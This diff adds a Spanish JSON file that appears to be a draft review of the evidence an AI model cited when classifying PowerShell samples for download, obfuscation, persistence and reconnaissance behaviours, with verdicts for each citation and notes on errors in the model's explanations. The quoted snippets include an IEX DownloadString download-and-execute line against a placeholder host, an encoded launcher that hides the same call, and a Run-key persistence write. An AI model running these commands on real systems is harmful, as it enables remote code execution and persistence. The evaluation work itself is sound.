@@ -1,0 +1,353 @@
+{
+  "reviewer": "AI-assist (borrador; pendiente de confirmacion humana)",
+  "method": "Revision manual de cada cita contra el script y la taxonomia v0.2. supports = respalda por si misma el comportamiento; partial = relacionada pero insuficiente sola; does_not_support = no respalda la afirmacion.",
+  "summary": {
+    "citations": 41,
+    "verdicts": {
+      "supports": 21,
+      "partial": 14,
+      "does_not_support": 6
+    },
+    "findings": {
+      "supported": 18,
+      "not_supported": 6
+    },
+    "runs_with_text_issues": 12
+  },
+  "text_issues_by_case": {
+    "P2": "risk_rationale especula sobre descarga/ejecucion remota sin haber decodificado el contenido.",
+    "P5": "explanation de B01 afirma 'using Invoke-WebRequest'; el script usa Net.WebClient.DownloadString.",
+    "P6": "explanation afirma 'downloading and executing remote code' sin decodificar el Base64.",
+    "P7": "risk_rationale afirma 'downloading and executing remote code'; el script no ejecuta lo descargado."
+  },
+  "items": [
+    {
+      "case_id": "P1",
+      "repetition": 1,
+      "behavior_id": "B05",
+      "snippet": "Get-Process",
+      "verdict": "supports",
+      "note": "Consulta de procesos del host."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 1,
+      "behavior_id": "B05",
+      "snippet": "Sort-Object -Property CPU -Descending",
+      "verdict": "partial",
+      "note": "Procesa la consulta; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 1,
+      "behavior_id": "B05",
+      "snippet": "Select-Object -First 5 -Property Name, Id, CPU",
+      "verdict": "partial",
+      "note": "Procesa la consulta; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P2",
+      "repetition": 1,
+      "behavior_id": "B02",
+      "snippet": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAFMAbwByAHQALQBPAGIAagBlAGMAdAAgAC0AUAByAG8AcABlAHIAdAB5ACAAQwBQAFUAIAAtAEQAZQBzAGMAZQBuAGQAaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAANQAgAC0AUAByAG8AcABlAHIAdAB5ACAATgBhAG0AZQAsACAASQBkACwAIABDAFAAVQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlAA==",
+      "verdict": "does_not_support",
+      "note": "El lanzador -EncodedCommand es tecnica de ofuscacion (LAUNCHER_ENCCMD), no B02. El modelo no decodifico el contenido."
+    },
+    {
+      "case_id": "P3",
+      "repetition": 1,
+      "behavior_id": "B01",
+      "snippet": "$u = 'https://' + 'example' + '.com/' + 'rep' + 'ort.csv'",
+      "verdict": "partial",
+      "note": "Construye la URL; una URL aislada no basta (taxonomia B01), se apoya en la llamada de la linea 4."
+    },
+    {
+      "case_id": "P3",
+      "repetition": 1,
+      "behavior_id": "B01",
+      "snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing",
+      "verdict": "supports",
+      "note": "Llamada de descarga con -Uri/-OutFile; el modelo reconstruyo Invoke-WebRequest en recovered_content."
+    },
+    {
+      "case_id": "P4",
+      "repetition": 1,
+      "behavior_id": "B03",
+      "snippet": "New-ItemProperty -Path $a -Name $b -Value $d -PropertyType String -Force",
+      "verdict": "supports",
+      "note": "Escritura de valor en la clave Run ($a se resuelve en la linea 1)."
+    },
+    {
+      "case_id": "P5",
+      "repetition": 1,
+      "behavior_id": "B01",
+      "snippet": "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.txt')",
+      "verdict": "supports",
+      "note": "La linea contiene DownloadString sobre una URL remota. La explicacion es incorrecta: atribuye la descarga a Invoke-WebRequest."
+    },
+    {
+      "case_id": "P6",
+      "repetition": 1,
+      "behavior_id": "B01",
+      "snippet": "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAoACcATgBlAHQALgAnACAAKwAgACcAVwBlAGIAQwBsAGkAZQBuAHQAJwApACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AJwAgACsAIAAnAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AJwAgACsAIAAnAHAAYQB5AGwAbwBhAGQALgB0AHgAdAAnACkA",
+      "verdict": "does_not_support",
+      "note": "Solo cita el blob Base64; no decodifico el contenido (recovered_content repite el lanzador). La etiqueta coincide con la referencia, pero la afirmacion no esta respaldada por la evidencia citada."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 1,
+      "behavior_id": "B01",
+      "snippet": "$u = '{2}{0}{3}{1}' -f 'example.com/', 'csv', 'https://', 'report.'",
+      "verdict": "partial",
+      "note": "Construye la URL con -f; por si sola no es descarga."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 1,
+      "behavior_id": "B01",
+      "snippet": "$c = '{1}{0}' -f 'WebRequest', 'Invoke-'",
+      "verdict": "supports",
+      "note": "Construye el nombre Invoke-WebRequest con -f."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 1,
+      "behavior_id": "B01",
+      "snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing",
+      "verdict": "supports",
+      "note": "Llamada de descarga."
+    },
+    {
+      "case_id": "P8",
+      "repetition": 1,
+      "behavior_id": "B03",
+      "snippet": "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'PilotLabUpdater' -Value 'C:\\ProgramData\\PilotLab\\no-existe\\updater.exe' -PropertyType String -Force",
+      "verdict": "supports",
+      "note": "Escritura de valor en la clave Run."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 2,
+      "behavior_id": "B05",
+      "snippet": "Get-Process",
+      "verdict": "supports",
+      "note": "Consulta de procesos del host."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 2,
+      "behavior_id": "B05",
+      "snippet": "Sort-Object -Property CPU -Descending",
+      "verdict": "partial",
+      "note": "Procesa la consulta; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 2,
+      "behavior_id": "B05",
+      "snippet": "Select-Object -First 5 -Property Name, Id, CPU",
+      "verdict": "partial",
+      "note": "Procesa la consulta; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 2,
+      "behavior_id": "B05",
+      "snippet": "Format-Table -AutoSize",
+      "verdict": "partial",
+      "note": "Muestra el resultado; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P2",
+      "repetition": 2,
+      "behavior_id": "B02",
+      "snippet": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAFMAbwByAHQALQBPAGIAagBlAGMAdAAgAC0AUAByAG8AcABlAHIAdAB5ACAAQwBQAFUAIAAtAEQAZQBzAGMAZQBuAGQAaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAANQAgAC0AUAByAG8AcABlAHIAdAB5ACAATgBhAG0AZQAsACAASQBkACwAIABDAFAAVQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlAA==",
+      "verdict": "does_not_support",
+      "note": "El lanzador -EncodedCommand es tecnica de ofuscacion (LAUNCHER_ENCCMD), no B02. El modelo no decodifico el contenido."
+    },
+    {
+      "case_id": "P3",
+      "repetition": 2,
+      "behavior_id": "B01",
+      "snippet": "$u = 'https://' + 'example' + '.com/' + 'rep' + 'ort.csv'",
+      "verdict": "partial",
+      "note": "Construye la URL; una URL aislada no basta (taxonomia B01), se apoya en la llamada de la linea 4."
+    },
+    {
+      "case_id": "P3",
+      "repetition": 2,
+      "behavior_id": "B01",
+      "snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing",
+      "verdict": "supports",
+      "note": "Llamada de descarga con -Uri/-OutFile; el modelo reconstruyo Invoke-WebRequest en recovered_content."
+    },
+    {
+      "case_id": "P4",
+      "repetition": 2,
+      "behavior_id": "B03",
+      "snippet": "New-ItemProperty -Path $a -Name $b -Value $d -PropertyType String -Force",
+      "verdict": "supports",
+      "note": "Escritura de valor en la clave Run ($a se resuelve en la linea 1)."
+    },
+    {
+      "case_id": "P5",
+      "repetition": 2,
+      "behavior_id": "B01",
+      "snippet": "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.txt')",
+      "verdict": "supports",
+      "note": "La linea contiene DownloadString sobre una URL remota. La explicacion es incorrecta: atribuye la descarga a Invoke-WebRequest."
+    },
+    {
+      "case_id": "P6",
+      "repetition": 2,
+      "behavior_id": "B01",
+      "snippet": "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAoACcATgBlAHQALgAnACAAKwAgACcAVwBlAGIAQwBsAGkAZQBuAHQAJwApACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AJwAgACsAIAAnAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AJwAgACsAIAAnAHAAYQB5AGwAbwBhAGQALgB0AHgAdAAnACkA",
+      "verdict": "does_not_support",
+      "note": "Solo cita el blob Base64; no decodifico el contenido (recovered_content repite el lanzador). La etiqueta coincide con la referencia, pero la afirmacion no esta respaldada por la evidencia citada."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 2,
+      "behavior_id": "B01",
+      "snippet": "$u = '{2}{0}{3}{1}' -f 'example.com/', 'csv', 'https://', 'report.'",
+      "verdict": "partial",
+      "note": "Construye la URL con -f; por si sola no es descarga."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 2,
+      "behavior_id": "B01",
+      "snippet": "$c = '{1}{0}' -f 'WebRequest', 'Invoke-'",
+      "verdict": "supports",
+      "note": "Construye el nombre Invoke-WebRequest con -f."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 2,
+      "behavior_id": "B01",
+      "snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing",
+      "verdict": "supports",
+      "note": "Llamada de descarga."
+    },
+    {
+      "case_id": "P8",
+      "repetition": 2,
+      "behavior_id": "B03",
+      "snippet": "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'PilotLabUpdater' -Value 'C:\\ProgramData\\PilotLab\\no-existe\\updater.exe' -PropertyType String -Force",
+      "verdict": "supports",
+      "note": "Escritura de valor en la clave Run."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 3,
+      "behavior_id": "B05",
+      "snippet": "Get-Process",
+      "verdict": "supports",
+      "note": "Consulta de procesos del host."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 3,
+      "behavior_id": "B05",
+      "snippet": "Sort-Object -Property CPU -Descending",
+      "verdict": "partial",
+      "note": "Procesa la consulta; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 3,
+      "behavior_id": "B05",
+      "snippet": "Select-Object -First 5 -Property Name, Id, CPU",
+      "verdict": "partial",
+      "note": "Procesa la consulta; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P1",
+      "repetition": 3,
+      "behavior_id": "B05",
+      "snippet": "Format-Table -AutoSize",
+      "verdict": "partial",
+      "note": "Muestra el resultado; por si sola no es reconocimiento."
+    },
+    {
+      "case_id": "P2",
+      "repetition": 3,
+      "behavior_id": "B02",
+      "snippet": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAFMAbwByAHQALQBPAGIAagBlAGMAdAAgAC0AUAByAG8AcABlAHIAdAB5ACAAQwBQAFUAIAAtAEQAZQBzAGMAZQBuAGQAaQBuAGcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAANQAgAC0AUAByAG8AcABlAHIAdAB5ACAATgBhAG0AZQAsACAASQBkACwAIABDAFAAVQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlAA==",
+      "verdict": "does_not_support",
+      "note": "El lanzador -EncodedCommand es tecnica de ofuscacion (LAUNCHER_ENCCMD), no B02. El modelo no decodifico el contenido."
+    },
+    {
+      "case_id": "P3",
+      "repetition": 3,
+      "behavior_id": "B01",
+      "snippet": "$u = 'https://' + 'example' + '.com/' + 'rep' + 'ort.csv'",
+      "verdict": "partial",
+      "note": "Construye la URL; una URL aislada no basta (taxonomia B01), se apoya en la llamada de la linea 4."
+    },
+    {
+      "case_id": "P3",
+      "repetition": 3,
+      "behavior_id": "B01",
+      "snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing",
+      "verdict": "supports",
+      "note": "Llamada de descarga con -Uri/-OutFile; el modelo reconstruyo Invoke-WebRequest en recovered_content."
+    },
+    {
+      "case_id": "P4",
+      "repetition": 3,
+      "behavior_id": "B03",
+      "snippet": "New-ItemProperty -Path $a -Name $b -Value $d -PropertyType String -Force",
+      "verdict": "supports",
+      "note": "Escritura de valor en la clave Run ($a se resuelve en la linea 1)."
+    },
+    {
+      "case_id": "P5",
+      "repetition": 3,
+      "behavior_id": "B01",
+      "snippet": "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.txt')",
+      "verdict": "supports",
+      "note": "La linea contiene DownloadString sobre una URL remota. La explicacion es incorrecta: atribuye la descarga a Invoke-WebRequest."
+    },
+    {
+      "case_id": "P6",
+      "repetition": 3,
+      "behavior_id": "B01",
+      "snippet": "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAoACcATgBlAHQALgAnACAAKwAgACcAVwBlAGIAQwBsAGkAZQBuAHQAJwApACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AJwAgACsAIAAnAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AJwAgACsAIAAnAHAAYQB5AGwAbwBhAGQALgB0AHgAdAAnACkA",
+      "verdict": "does_not_support",
+      "note": "Solo cita el blob Base64; no decodifico el contenido (recovered_content repite el lanzador). La etiqueta coincide con la referencia, pero la afirmacion no esta respaldada por la evidencia citada."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 3,
+      "behavior_id": "B01",
+      "snippet": "$u = '{2}{0}{3}{1}' -f 'example.com/', 'csv', 'https://', 'report.'",
+      "verdict": "partial",
+      "note": "Construye la URL con -f; por si sola no es descarga."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 3,
+      "behavior_id": "B01",
+      "snippet": "$c = '{1}{0}' -f 'WebRequest', 'Invoke-'",
+      "verdict": "supports",
+      "note": "Construye el nombre Invoke-WebRequest con -f."
+    },
+    {
+      "case_id": "P7",
+      "repetition": 3,
+      "behavior_id": "B01",
+      "snippet": "& $c -Uri $u -OutFile $destino -UseBasicParsing",
+      "verdict": "supports",
+      "note": "Llamada de descarga."
+    },
+    {
+      "case_id": "P8",
+      "repetition": 3,
+      "behavior_id": "B03",
+      "snippet": "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'PilotLabUpdater' -Value 'C:\\ProgramData\\PilotLab\\no-existe\\updater.exe' -PropertyType String -Force",
+      "verdict": "supports",
+      "note": "Escritura de valor en la clave Run."
+    }
+  ]
+}
